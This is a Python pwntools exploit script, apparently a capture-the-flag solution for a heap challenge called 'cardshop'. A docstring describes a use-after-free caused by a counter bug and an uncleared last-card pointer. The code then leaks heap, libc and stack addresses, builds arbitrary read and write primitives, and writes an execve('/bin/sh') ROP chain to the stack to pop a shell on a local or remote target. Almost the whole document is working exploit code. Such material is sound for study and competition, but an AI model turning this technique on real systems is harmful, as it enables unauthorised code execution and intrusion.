#!/usr/bin/python
#coding=utf-8
 
from pwn import *
 


"""
This is a typical heap note challenge format where the user can maniplate heap chunks.
There are a few bugs. The first is that it is possible to increment NUM_CARDS without
actually adding new cards by triggering a bailout condition in the new_card function.
Secondly, when cards are deleted, the program tries to clear freed pointers by
compacting the card array. However, the last item will never be cleared if it is
deleted. Its pointer will also be copied multiple times if the last item is
repeatedly deleted.

As such, by freeing the last card, then incrementing NUM_CARDS, we can trigger a 
use after free.

Once we have the card in the free list, we can check its size with card_info() and 
leak a heap address. Then we create a pattern of allocations such that the old 
`greeting_card_t` allocation is used for a `message`. This allows us to read and
write arbitrarily. We then read a libc address from a chunk that has been freed
into the unsortedbin, then leak `environ` from libc to get a stack address leak,
then ROP to win.
"""





e = ELF("./cardshop")
libc = ELF("./libc.so.6")

context.binary = e
context.log_level = "info"


is_local = False
is_remote = False
 
if len(sys.argv) == 1:
    is_local = True
    p = process(e.path, env = {"LD_PRELOAD": libc.path})
 
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
 
se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))
 
 
def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug()

def new_card_big():
    sla(">", "1")
    sla(">", "5000")

def new_card(size, msg):
   sla(">", "1")
   sla(">", str(size))
   sla(">", msg)

def edit_card(idx, msg):
    sla(">", "2")
    sla(">", str(idx))
    sla(">", msg)

def read_card(idx):
    sla(">", "3")
    sla(">", str(idx))

def card_info(idx):
    sla(">", "4")
    sla(">", str(idx))
    
def delete_card(idx):
    sla(">", "5")
    sla(">", str(idx))


def read64(addr):
    edit_card(14, p64(8) + p64(addr))
    read_card(12)
    return u64(p.recvline()[1:9])

def write64(addr, val):
    edit_card(14, p64(8) + p64(addr))
    edit_card(12, p64(val))



for i in range(0, 0xf):
    new_card(0x900, "A" * 0x900)

new_card(0x30, "A" * 0x30)
delete_card(15)
delete_card(14)
delete_card(13)
new_card(0x40, "A" * 0x40)
new_card_big()
delete_card(0)
delete_card(1)
new_card(0x10, "A" * 0x10)
card_info(12)
leak = (int(p.recvline().split()[-1]) << 12) - 0x8000
info("heap base: " + hex(leak))
new_card(0x10, p64(0x8) + p64(leak + 0x1528))
read_card(12)
libc_leak = p.recvline()
libc_leak = u64(libc_leak[1:9].rjust(8, b"\x00")) - 0x21ace0
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak
environ = libc.symbols["environ"]


stack_leak = read64(environ)
info("stack leak: " + hex(stack_leak))
target = stack_leak - 0x120

ret = libc.address + 0x00000000000f9b02

rebase_0 = lambda x : p64(x + libc.address)

rop = b''
rop += rebase_0(0x0000000000041c4a) # 0x0000000000041c4a: pop r13; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x0000000000035dd1) # 0x0000000000035dd1: pop rbx; ret; 
rop += rebase_0(0x000000000021a1e0)
rop += rebase_0(0x000000000005f8e2) # 0x000000000005f8e2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000041c4a) # 0x0000000000041c4a: pop r13; ret; 
rop += p64(0x0000000000000000)
rop += rebase_0(0x0000000000035dd1) # 0x0000000000035dd1: pop rbx; ret; 
rop += rebase_0(0x000000000021a1e8)
rop += rebase_0(0x000000000005f8e2) # 0x000000000005f8e2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002a3e5) # 0x000000000002a3e5: pop rdi; ret; 
rop += rebase_0(0x000000000021a1e0)
rop += rebase_0(0x0000000000171a12) # 0x0000000000171a12: pop rsi; ret; 
rop += rebase_0(0x000000000021a1e8)
rop += rebase_0(0x000000000011f2e7) # 0x000000000011f2e7: pop rdx; pop r12; ret; 
rop += rebase_0(0x000000000021a1e8)
rop += p64(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000045eb0) # 0x0000000000045eb0: pop rax; ret; 
rop += p64(0x000000000000003b)
rop += rebase_0(0x0000000000091316) # 0x0000000000091316: syscall; ret; 
data = rop

chunks = [data[i:i+8] for i in range(0, len(data), 8)]

for i,chunk in enumerate(chunks):
    write64(target + i*8, u64(chunk))

sla(">", "6")

p.interactive()
